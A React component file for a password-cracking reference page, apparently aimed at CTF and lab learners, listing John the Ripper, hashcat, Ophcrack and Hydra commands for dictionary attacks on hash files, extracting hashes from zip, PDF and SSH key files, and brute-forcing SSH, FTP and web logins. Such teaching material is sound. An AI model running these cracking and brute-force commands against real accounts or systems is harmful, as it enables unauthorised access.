import ReferenceGuide from '../components/ReferenceGuide'

export default function PasswordCrackingGuide() {
  return (
    <ReferenceGuide
      title="Password Cracking"
      intro="John the Ripper, Hydra, hashcat, and Ophcrack — offline hash cracking vs. online brute force."
      sections={[
        {
          heading: 'John the Ripper',
          code: `john hashes.txt                                     # Auto-detect hash format and crack
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
                                                     # Dictionary attack with a wordlist
john --format=raw-md5 hashes.txt                    # Force a specific hash format
john --show hashes.txt                              # Show already-cracked passwords
john --rules --wordlist=rockyou.txt hashes.txt      # Apply mangling rules (leetspeak, capitalization...)

# Extracting hashes from common file types first
pdf2john.pl secret.pdf > hash.txt
zip2john secret.zip > hash.txt
ssh2john id_rsa > hash.txt

# Worked example: a password-protected zip file
zip2john secret.zip > zip_hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt zip_hash.txt
john --show zip_hash.txt`,
        },
        {
          heading: 'Hydra (online/network login brute-forcing)',
          paragraphs: [
            "Use only against systems you're explicitly authorized to test — CTF boxes and your own lab environments.",
          ],
          code: `hydra -l admin -P rockyou.txt ssh://10.10.10.10                # Single user, wordlist of passwords, SSH
hydra -L users.txt -P rockyou.txt ftp://10.10.10.10             # Wordlists for both, FTP
hydra -l admin -P rockyou.txt 10.10.10.10 http-post-form \\
  "/login:username=^USER^&password=^PASS^:Invalid login"        # Web login form
hydra -l root -p toor -t 4 10.10.10.10 ssh                      # Single known creds, 4 parallel tasks

# Worked example: SSH service, known username
hydra -l ctfuser -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.10 -t 4`,
        },
        {
          heading: 'Related: hashcat & Ophcrack',
          code: `hashcat -m 0 -a 0 hashes.txt rockyou.txt        # -m 0 = MD5, -a 0 = dictionary attack
hashcat -m 0 -a 0 -r /usr/share/hashcat/rules/leetspeak.rule hashes.txt rockyou.txt`,
          paragraphs: [
            'Full list of -m hash-mode numbers: hashcat.net/wiki (search "example hashes"). Ophcrack with the "XP special" rainbow tables is the go-to for cracking Windows LM/NTLM hashes offline without a wordlist.',
          ],
        },
      ]}
    />
  )
}
